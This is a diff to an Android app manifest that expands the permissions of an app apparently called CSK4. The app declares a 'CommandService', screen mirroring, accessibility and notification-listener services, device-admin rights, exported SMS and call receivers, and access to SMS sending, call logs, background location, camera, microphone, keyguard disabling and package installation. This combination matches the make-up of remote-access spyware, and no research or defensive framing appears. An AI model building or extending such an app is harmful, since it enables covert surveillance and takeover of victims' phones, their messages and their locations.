@@ -2,56 +2,74 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- ============ NETWORK ============ -->
+    <!-- ============ NETWORK (7) ============ -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.NEARBY_WIFI_DEVICES"
+        android:usesPermissionFlags="neverForLocation" tools:targetApi="tiramisu" />
+    <uses-permission android:name="android.permission.BIND_VPN_SERVICE"
+        tools:ignore="ProtectedPermissions" />
 
-    <!-- ============ CAMERA & MEDIA ============ -->
+    <!-- ============ CAMERA & MEDIA (5) ============ -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
 
-    <!-- ============ LOCATION ============ -->
+    <!-- ============ LOCATION (3) ============ -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
-    <!-- ============ CONTACTS ============ -->
+    <!-- ============ CONTACTS & PROFILE (4) ============ -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.READ_PROFILE" />
 
-    <!-- ============ SMS & CALLS ============ -->
+    <!-- ============ SMS (4) ============ -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_MMS" />
+
+    <!-- ============ CALLS (7) ============ -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
     <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.FOREGROUND_PHONE_CALL" />
 
-    <!-- ============ STORAGE ============ -->
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
-    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
+    <!-- ============ STORAGE (6) ============ -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="28" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
+        tools:ignore="ScopedStorage" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
 
-    <!-- ============ BLUETOOTH ============ -->
-    <uses-permission android:name="android.permission.BLUETOOTH" android:maxSdkVersion="30" />
-    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" android:maxSdkVersion="30" />
+    <!-- ============ CALENDAR (1) ============ -->
+    <uses-permission android:name="android.permission.READ_CALENDAR" />
+
+    <!-- ============ BLUETOOTH (4) ============ -->
+    <uses-permission android:name="android.permission.BLUETOOTH"
+        android:maxSdkVersion="30" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"
+        android:maxSdkVersion="30" />
     <uses-permission android:name="android.permission.BLUETOOTH_SCAN"
         android:usesPermissionFlags="neverForLocation" tools:targetApi="s" />
     <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
-    <uses-permission android:name="android.permission.NEARBY_WIFI_DEVICES"
-        android:usesPermissionFlags="neverForLocation" tools:targetApi="tiramisu" />
 
-    <!-- ============ SYSTEM ============ -->
+    <!-- ============ SYSTEM SERVICES (15) ============ -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
@@ -59,31 +77,41 @@
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.FLASHLIGHT" />
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
-        tools:ignore="QueryAllPackagesPermission" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SET_ALARM" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-
-    <!-- ============ SETTINGS CONTROL ============ -->
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
     <uses-permission android:name="android.permission.WRITE_SETTINGS"
         tools:ignore="ProtectedPermissions" />
-    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
-    <!-- ============ NOTIFICATION LISTENER ============ -->
+    <!-- ============ DEVICE ADMIN (1) ============ -->
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"
+        tools:ignore="ProtectedPermissions" />
+
+    <!-- ============ ACCESSIBILITY (2) ============ -->
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.ACCESSIBILITY_SERVICE"
+        tools:ignore="ProtectedPermissions" />
+
+    <!-- ============ NOTIFICATION LISTENER (1) ============ -->
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
         tools:ignore="ProtectedPermissions" />
 
-    <!-- ============ INSTALL APPS ============ -->
+    <!-- ============ INSTALL APPS (2) ============ -->
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
     <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
 
-    <!-- ============ USAGE STATS ============ -->
+    <!-- ============ USAGE STATS (1) ============ -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
 
-    <!-- ============ SCREEN CAPTURE ============ -->
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <!-- ============ PACKAGE QUERY (1) ============ -->
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
 
     <!-- ============ FEATURES ============ -->
     <uses-feature android:name="android.hardware.camera" android:required="false" />
@@ -107,7 +135,6 @@
         android:largeHeap="true"
         tools:targetApi="31">
 
-        <!-- ============ ACTIVITIES ============ -->
         <activity android:name=".SplashActivity"
             android:exported="true"
             android:theme="@style/Theme.CSK4.Splash">
@@ -122,12 +149,11 @@
         <activity android:name=".MainActivity" android:exported="false" />
         <activity android:name=".WebViewActivity" android:exported="false" />
 
-        <!-- ============ SERVICES ============ -->
         <service
             android:name=".CommandService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="location|dataSync|camera|microphone|mediaProjection" />
+            android:foregroundServiceType="location|dataSync|camera|microphone|mediaProjection|phoneCall" />
 
         <service
             android:name=".ScreenMirrorService"
@@ -148,7 +174,6 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- ============ NOTIFICATION LISTENER ============ -->
         <service
             android:name=".NotificationListener"
             android:enabled="true"
@@ -160,7 +185,6 @@
             </intent-filter>
         </service>
 
-        <!-- ============ RECEIVERS ============ -->
         <receiver
             android:name=".DeviceAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -180,7 +204,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ============ SMS RECEIVER ============ -->
         <receiver
             android:name=".SMSReceiver"
             android:exported="true"
@@ -190,7 +213,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ============ CALL MONITOR ============ -->
         <receiver
             android:name=".CallReceiver"
             android:exported="true">
@@ -200,7 +222,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ============ FILE PROVIDER ============ -->
         <provider
             android:name="androidx.core.content.FileProvider"
             android:authorities="${applicationId}.provider"
